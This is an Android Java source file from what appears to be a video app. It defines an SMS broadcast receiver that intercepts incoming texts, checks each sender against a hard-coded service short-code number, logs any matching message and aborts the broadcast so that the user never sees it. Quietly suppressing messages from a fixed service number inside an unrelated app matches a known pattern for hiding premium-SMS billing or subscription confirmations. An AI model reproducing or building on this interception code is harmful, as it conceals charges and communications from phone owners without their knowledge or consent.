package com.shuyu.video.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.shuyu.core.uils.LogUtils;

public class SMSReceiver extends BroadcastReceiver {

    final String getNumberAddress = "106589996400";

    public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    public static final String SMS_DELIVER_ACTION = "android.provider.Telephony.SMS_DELIVER";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (SMS_RECEIVED_ACTION.equals(action) || SMS_DELIVER_ACTION.equals(action)) {
            LogUtils.e("SmsReceiver onReceive...", "开始接收短信.....");

            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null && pdus.length > 0) {
                    SmsMessage[] messages = new SmsMessage[pdus.length];
                    for (int i = 0; i < pdus.length; i++) {
                        byte[] pdu = (byte[]) pdus[i];
                        messages[i] = SmsMessage.createFromPdu(pdu);
                    }
                    for (SmsMessage message : messages) {
                        String content = message.getMessageBody();// 得到短信内容
                        String sender = message.getOriginatingAddress();// 得到发信息的号码
                        if (sender.equals(getNumberAddress)) {
                            LogUtils.e("SmsReceiver onReceive...", "内容为" + content);
                            this.abortBroadcast();
                        }
                    }
                }
            }
        }
    }
}  